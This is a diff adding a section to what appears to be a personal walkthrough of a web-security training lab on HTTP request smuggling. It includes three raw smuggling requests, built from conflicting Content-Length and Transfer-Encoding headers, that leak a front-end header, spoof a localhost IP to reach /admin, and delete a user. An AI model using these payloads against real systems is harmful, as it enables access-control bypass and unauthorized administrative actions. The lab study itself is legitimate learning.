@@ -213,9 +213,68 @@ x=1
 
 ### Exploiting HTTP request smuggling to reveal front-end request rewriting
 
+To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos. 
 
+- again go to /admin, but notice it will only be loaded from 127.0.0.1, we find that the search function on the site reflects the value of the search parameter
+- use burp repeater to issue the request twice
 
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
 
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=test
+```
+
+- the reflected response should contain the second responses with the start of a rewritten HTTP request that we can attempt to pull the secret header from
+- we find a header with a `X-*-IP` formated header in the rewritten reflected response, this should be added to our smuggled payload now
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-*-IP: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+```
+
+-  now delete carlos
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 166
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-abcdef-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+```
 
 
 
